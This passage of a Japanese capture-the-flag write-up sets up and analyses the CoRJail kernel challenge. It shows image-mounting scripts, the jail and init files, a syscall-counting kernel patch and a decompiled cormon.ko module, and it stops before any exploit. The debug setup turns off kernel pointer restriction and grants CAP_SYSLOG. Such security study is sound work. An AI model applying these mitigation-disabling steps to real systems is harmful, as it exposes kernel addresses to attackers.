</span></span><span style=display:flex><span>QCOW<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>realpath <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>PWD<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>/../build/coros/coros.qcow2<span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sudo modprobe nbd max_part<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>mkdir -p $MNTPOINT
</span></span><span style=display:flex><span>sudo qemu-nbd --connect<span style=color:#f92672>=</span>/dev/nbd0 <span style=color:#e6db74>&#34;</span>$QCOW<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>sudo fdisk -l /dev/nbd0
</span></span><span style=display:flex><span>sudo mount /dev/nbd0 $MNTPOINT
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>### umount.bash</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>set -eu
</span></span><span style=display:flex><span>MNTPOINT<span style=color:#f92672>=</span>/tmp/hoge
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sudo umount $MNTPOINT <span style=color:#f92672>||</span> true
</span></span><span style=display:flex><span>sudo qemu-nbd --disconnect /dev/nbd0
</span></span><span style=display:flex><span>sudo rmmod nbd
</span></span></code></pre></div><p>さて、最初に起動フローを把握しておきます。上のスクリプトでマウントされたファイルシステムを見ると、<code>/etc/inittab</code>は以下の感じです。</p><pre tabindex=0><code class=language-inittab data-lang=inittab>T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100
</code></pre><p>普通ですね。続いて<code>/etc/init.d/docker</code>あたりにdockerデーモンのサービススクリプトがありますが、これもまあ普通なので割愛。<code>/etc/systemd/system/init.service</code>には以下のようにサービスが登録されています:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-/etc/systemd/system/init.service data-lang=/etc/systemd/system/init.service><span style=display:flex><span><span style=color:#66d9ef>[Unit]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Description</span><span style=color:#f92672>=</span><span style=color:#e6db74>Initialize challenge</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>[Service]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Type</span><span style=color:#f92672>=</span><span style=color:#e6db74>oneshot</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ExecStart</span><span style=color:#f92672>=</span><span style=color:#e6db74>/usr/local/bin/init</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>[Install]</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>WantedBy</span><span style=color:#f92672>=</span><span style=color:#e6db74>multi-user.target</span>
</span></span></code></pre></div><p><code>ExecStart</code>である<code>/usr/local/bin/init</code>はこんな感じ:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-/usr/local/bin/init.sh data-lang=/usr/local/bin/init.sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>USER<span style=color:#f92672>=</span>user
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>FLAG<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>head -n <span style=color:#ae81ff>100</span> /dev/urandom | sha512sum | awk <span style=color:#e6db74>&#39;{printf $1}&#39;</span><span style=color:#66d9ef>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>useradd --create-home --shell /bin/bash $USER
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;export PS1=&#39;\[\033[01;31m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# &#39;&#34;</span>  &gt;&gt; /root/.bashrc
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;export PS1=&#39;\[\033[01;35m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;&#34;</span> &gt;&gt; /home/$USER/.bashrc
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>chmod -r <span style=color:#ae81ff>0700</span> /home/$USER
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mv /root/temp /root/$FLAG
</span></span><span style=display:flex><span>chmod <span style=color:#ae81ff>0400</span> /root/$FLAG
</span></span></code></pre></div><p>新しいユーザ(<code>user</code>)を作って、PS1をイかした感じにして、<code>flag</code>をroot onlyにしているくらいです。続いて、<code>/etc/passwd</code>はこんな感じ:</p><pre tabindex=0><code class=language-/etc/passwd data-lang=/etc/passwd>root:x:0:0:root:/root:/usr/local/bin/jail
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
(snipped...)
</code></pre><p><code>root</code>のログインシェルが<code>/usr/local/bin/jail</code>になっています:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-/usr/local/bin/jail.sh data-lang=/usr/local/bin/jail.sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>echo -e <span style=color:#e6db74>&#39;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#39;</span>
</span></span><span style=display:flex><span>/usr/bin/docker run -it --user user --hostname CoRJail --security-opt seccomp<span style=color:#f92672>=</span>/etc/docker/corjail.json -v /proc/cormon:/proc_rw/cormon:rw corcontainer
</span></span><span style=display:flex><span>/usr/sbin/poweroff -f
</span></span></code></pre></div><p><code>user</code>としてdockerを起動したあと、<code>poweroff</code>をしていますね。ここがメインの処理みたいです。<code>--security-opt seccomp=/etc/docker/corjail.json</code>を指定していますが、seccomp filterの内容は後ほど見ていくことにします。<code>/proc/cormon</code>という謎のproc fsもバインドマウントしていますが、これも後ほど見ていくことにします。
というわけで、ゲストOSのroot(not on docker)を触りたいときには、<code>/etc/passwd</code>のログインシェルを<code>/bin/bash</code>あたりにしておけばいいことがわかりました。rootで<code>docker images</code>してみると、以下の感じ:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-.bash data-lang=.bash><span style=display:flex><span>root@CoROS:~# docker images
</span></span><span style=display:flex><span>REPOSITORY     TAG             IMAGE ID       CREATED        SIZE
</span></span><span style=display:flex><span>corcontainer   latest          8279763e02ce   <span style=color:#ae81ff>2</span> months ago   84.7MB
</span></span><span style=display:flex><span>debian         bullseye-slim   c9cb6c086ef7   <span style=color:#ae81ff>3</span> months ago   80.4MB
</span></span></code></pre></div><p>先程<code>jail</code>の中でも指定されていた<code>corcontainer</code>がありますね。これはどうやってつくられたのでしょう。<code>build_image.sh</code>を見てみると、以下の記述があります:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-build_image.sh data-lang=build_image.sh><span style=display:flex><span>tar -xzvf coros/files/docker/image/image.tar.gz -C coros/files/docker
</span></span><span style=display:flex><span>cp -rp coros/files/docker/var/lib/docker $FS/var/lib/
</span></span><span style=display:flex><span>rm -rf coros/files/docker/var
</span></span></code></pre></div><p>Docker imageは予め作られたものを使っているようです。デバッグ時には常に最新のexploitをguest OSのdockerコンテナ上に置いておきたいので、<code>/usr/local/bin/jail</code>を以下のように変更しておきましょう:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-/usrr/local/bin/jail.sh data-lang=/usrr/local/bin/jail.sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>echo -e <span style=color:#e6db74>&#39;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#39;</span>
</span></span><span style=display:flex><span>cp /exploit /home/user <span style=color:#f92672>||</span> echo <span style=color:#e6db74>&#34;[!] exploit not found, skipping&#34;</span>
</span></span><span style=display:flex><span>chown -R user:user /home/user
</span></span><span style=display:flex><span>echo <span style=color:#ae81ff>0</span> &gt; /proc/sys/kernel/kptr_restrict
</span></span><span style=display:flex><span>/usr/bin/docker run -it --user root <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --hostname CoRJail <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --security-opt seccomp<span style=color:#f92672>=</span>/etc/docker/corjail.json <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  --add-cap CAP_SYSLOG <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -v /proc/cormon:/proc_rw/cormon:rw <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  -v /home/user/:/home/user/host <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>  corcontainer
</span></span><span style=display:flex><span>/usr/sbin/poweroff -f
</span></span></code></pre></div><p>あとは<code>exploit</code>をguestのファイルシステムにおいておけば、勝手にコンテナ内の<code>/home/user/exploit</code>に配置されて便利ですね。ついでに<code>CAP_SYSLOG</code>を与えることで<code>/proc/kallsysm</code>を見れるようにしています。
因みに諸々のめんどくさいことは、<a href=https://github.com/smallkirby/lysithea>lysithea</a>が全部面倒見てくれるので、最初のセットアップを除くと実際には以下のコマンドを打つだけです:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lysithea.bash data-lang=lysithea.bash><span style=display:flex><span>lysithea init <span style=color:#75715e># first time only</span>
</span></span><span style=display:flex><span>lysithea extract <span style=color:#75715e># first time only</span>
</span></span><span style=display:flex><span>lysithea local
</span></span></code></pre></div><h2 id=static-analysis>static analysis</h2><h3 id=misc>misc</h3><p>lysithea曰く:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lysithea.bash data-lang=lysithea.bash><span style=display:flex><span>root@CoRJail:/home/user/host# ./drothea --verbose
</span></span><span style=display:flex><span>Drothea v1.0.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>.<span style=color:#f92672>]</span> kernel version:
</span></span><span style=display:flex><span>        Linux version 5.10.127 <span style=color:#f92672>(</span>root@VPS<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>gcc <span style=color:#f92672>(</span>Debian 8.3.0-6<span style=color:#f92672>)</span> 8.3.0, GNU ld <span style=color:#f92672>(</span>GNU Binutils <span style=color:#66d9ef>for</span> Debian<span style=color:#f92672>)</span> 2.31.1<span style=color:#f92672>)</span> <span style=color:#75715e>#2 SMP Thu January 1 00:00:00 UTC 2030</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> CONFIG_KALLSYMS_ALL is enabled.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> unprivileged ebpf installation is enabled.
</span></span><span style=display:flex><span>cat: /proc/sys/vm/unprivileged_userfaultfd: No such file or directory
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> unprivileged userfaultfd is disabled.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>?<span style=color:#f92672>]</span> KASLR seems enabled. Should turn off <span style=color:#66d9ef>for</span> debug purpose.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>?<span style=color:#f92672>]</span> kptr seems restricted. Should try <span style=color:#e6db74>&#39;echo 0 &gt; /proc/sys/kernel/kptr_restrict&#39;</span> in init script.
</span></span><span style=display:flex><span>root@CoRJail:/home/user/host# ./ingrid --verbose
</span></span><span style=display:flex><span>Ingrid v1.0.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> userfualtfd is disabled.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> CONFIG_DEVMEM is disabled.
</span></span></code></pre></div><p>基本的セキュリティ機構は全部有効です。さて、kernelのビルドスクリプト(<code>build_kernel.sh</code>を読むと、以下のようなパッチがあたっています:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-patch.diff data-lang=patch.diff><span style=display:flex><span>diff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/arch/x86/entry/syscall_64.c	2022-06-29 08:59:54.000000000 +0200
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/arch/x86/entry/syscall_64.c	2022-07-02 12:34:11.237778657 +0200
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -17,6 +17,9 @@
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> 
</span></span><span style=display:flex><span> #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym,
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span> asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {
</span></span><span style=display:flex><span> 	/*
</span></span><span style=display:flex><span> 	 * Smells like a compiler bug -- it doesn&#39;t work
</span></span><span style=display:flex><span>diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h
</span></span><span style=display:flex><span><span style=color:#f92672>--- a/arch/x86/include/asm/syscall_wrapper.h	2022-06-29 08:59:54.000000000 +0200
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/arch/x86/include/asm/syscall_wrapper.h	2022-07-02 12:34:11.237778657 +0200
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -219,9 +220,41 @@
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> 
</span></span><span style=display:flex><span> #define SYSCALL_DEFINE_MAXARGS	6
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#f92672>-#define SYSCALL_DEFINEx(x, sname, ...)				\
</span></span></span><span style=display:flex><span><span style=color:#f92672>-	SYSCALL_METADATA(sname, x, __VA_ARGS__)			\
</span></span></span><span style=display:flex><span><span style=color:#f92672>-	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)
</span></span></span><span style=display:flex><span><span style=color:#f92672></span><span style=color:#a6e22e>+DECLARE_PER_CPU(u64[], __per_cpu_syscall_count);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__));
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#define __SYSCALL_COUNT(syscall_nr) \
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	this_cpu_inc(__per_cpu_syscall_count[(syscall_nr)])
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#define SYSCALL_COUNT_FUNCx(sname, x, ...)					\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	{									\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+		__SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr);		\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+		return __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__));	\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	}									\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__))
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#define SYSCALL_COUNT_DECLARE0(sname) \
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	static inline long __count_sys_##sname(void);
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#define SYSCALL_COUNT_FUNC0(sname)					\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	{								\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+		__SYSCALL_COUNT(__syscall_meta__##sname.syscall_nr);	\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+		return __count_sys_##sname();				\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	}								\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	static inline long __count_sys_##sname(void)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#define SYSCALL_DEFINEx(x, sname, ...)			\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	SYSCALL_METADATA(sname, x, __VA_ARGS__)		\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	SYSCALL_COUNT_DECLAREx(sname, x, __VA_ARGS__)	\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)	\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	SYSCALL_COUNT_FUNCx(sname, x, __VA_ARGS__)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+#define SYSCALL_DEFINE0(sname)		\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	SYSCALL_COUNT_DECLARE0(sname)	\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	__SYSCALL_DEFINE0(sname)	\
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>+	SYSCALL_COUNT_FUNC0(sname)
</span></span></span><span style=display:flex><span><span style=color:#a6e22e></span>
</span></span><span style=display:flex><span>(snpped...)
</span></span></code></pre></div><p>これは<a href=https://lwn.net/Articles/896474/>procfsにsyscallのanalyticsを追加するパッチ</a>みたいです。パッチからもわかるように、各CPUに<code>__per_cpu_syscall_count</code>という変数が追加され、syscallの呼び出し回数を記録するようになっています。</p><h3 id=module-analysis-rev>module analysis (rev)</h3><p>続いて、本問題のメインであるカーネルモジュール(<code>cormon.ko</code>)を見ていきます。そして気づく、ソースコードが配布されてない！！！きっとおっちょこちょいでソースを配布し忘れてしまったんでしょう。仕方がないのでGhidraで見ていきましょう。デコンパイルして適当に見やすく整形するとこんな感じ:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-decompiled.c data-lang=decompiled.c><span style=display:flex><span><span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>initial_filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;sys_execve,sys_execveat,sys_fork,sys_keyctl,sys_msgget,sys_msgrcv,sys_msgsnd,sys_poll,sys_ptrace,sys_setxattr,sys_unshare&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> proc_ops cormon_proc_ops <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>  .proc_open <span style=color:#f92672>=</span> cormon_proc_open,
</span></span><span style=display:flex><span>  .proc_write <span style=color:#f92672>=</span> cormon_proc_write,
</span></span><span style=display:flex><span>  .proc_read <span style=color:#f92672>=</span> seq_read,
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> seq_operations cormon_seq_ops <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>  .start <span style=color:#f92672>=</span> cormon_seq_start,
</span></span><span style=display:flex><span>  .stop <span style=color:#f92672>=</span> cormon_seq_stop,
</span></span><span style=display:flex><span>  .next <span style=color:#f92672>=</span> cormon_seq_next,
</span></span><span style=display:flex><span>  .show <span style=color:#f92672>=</span> cormon_seq_show,
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>init_module</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  printk(<span style=color:#e6db74>&#34;6[CoRMon::Init] Initializing module...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (proc_create(<span style=color:#e6db74>&#34;cormon&#34;</span>, <span style=color:#ae81ff>0x1B5</span>, <span style=color:#ae81ff>0</span>, cormon_proc_ops) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0xC</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (update_filter(initial_filter) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>0x16</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  printk(<span style=color:#e6db74>&#34;3[CoRMon::Error] proc_create() call failed!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cormon_proc_open</span>(<span style=color:#66d9ef>struct</span> <span style=color:#f92672>*</span>inode inode, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>fp) {
</span></span><span style=display:flex><span>  seq_open(fp, cormon_seq_ops);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ssize_t <span style=color:#a6e22e>cormon_proc_write</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>fp, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> __user <span style=color:#f92672>*</span>ubuf, size_t size, loff_t <span style=color:#f92672>*</span>offset) {
</span></span><span style=display:flex><span>  size_t sz;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>heap;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>*</span>offset <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0xffffffffffffffea</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>*</span>offset <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x1000</span> <span style=color:#f92672>&amp;&amp;</span> size <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>0x1000</span> <span style=color:#f92672>&lt;</span> size) sz <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xFFF</span>;
</span></span><span style=display:flex><span>    heap <span style=color:#f92672>=</span> kmem_cache_alloc_trace(<span style=color:#f92672>?</span>, <span style=color:#ae81ff>0xA20</span>, <span style=color:#ae81ff>0x1000</span>);
</span></span><span style=display:flex><span>    printk(<span style=color:#e6db74>&#34;6[CoRMon::Debug] Syscalls @ %#llx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (heap <span style=color:#f92672>==</span> NULL) {
</span></span><span style=display:flex><span>      printk(<span style=color:#e6db74>&#34;3[CoRMon::Error] kmalloc() call failed!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0xfffffffffffffff4</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (copy_from_user(heap, ubuf, sz) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>      printk(<span style=color:#e6db74>&#34;3[CoRMon::Error] copy_from_user() call failed!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0xfffffffffffffff2</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    heap[sz] <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (update_filter(heap)) {
</span></span><span style=display:flex><span>      kfree(heap);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      kfree(heap);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0xffffffffffffffea</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> <span style=color:#a6e22e>update_filter</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>syscall_str) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>syscall;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> syscall_nr;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> syscall_list[<span style=color:#f92672>?</span>] <span style=color:#f92672>=</span> {<span style=color:#ae81ff>0</span>};
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>(syscall <span style=color:#f92672>=</span> strsep(syscall, <span style=color:#e6db74>&#34;,&#34;</span>) <span style=color:#f92672>&amp;&amp;</span> syscall <span style=color:#f92672>!=</span> NULL <span style=color:#f92672>&amp;&amp;</span> syscall_str <span style=color:#f92672>!=</span> NULL) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>((syscall_nr <span style=color:#f92672>=</span> get_syscall_nr(syscall)) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>      printk(<span style=color:#e6db74>&#34;3[CoRMon::Error] Invalid syscall: %s!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, syscall);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0xffffffea</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    syscall_list[syscall_nr] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  memcpy(filter, syscall_list, <span style=color:#ae81ff>0x37</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>cormon_seq_show</span>(<span style=color:#66d9ef>struct</span> seq_file <span style=color:#f92672>*</span>sfp, <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>vp) {
</span></span><span style=display:flex><span>  ulong v <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>vp;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (v <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> n <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    seq_putc(sfp, <span style=color:#ae81ff>0xA</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span>((n <span style=color:#f92672>=</span> cpumask_next(n, <span style=color:#f92672>&amp;</span>__cpu_online_mask)) <span style=color:#f92672>&lt;</span> _nr_cpu_ids) { <span style=color:#75715e>// for_each_cpu macro?
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      seq_printf(sfp, <span style=color:#e6db74>&#34;%9s%d&#34;</span>, <span style=color:#e6db74>&#34;CPU&#34;</span>, n);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    seq_printf(sfp, <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>Syscall (NR)</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
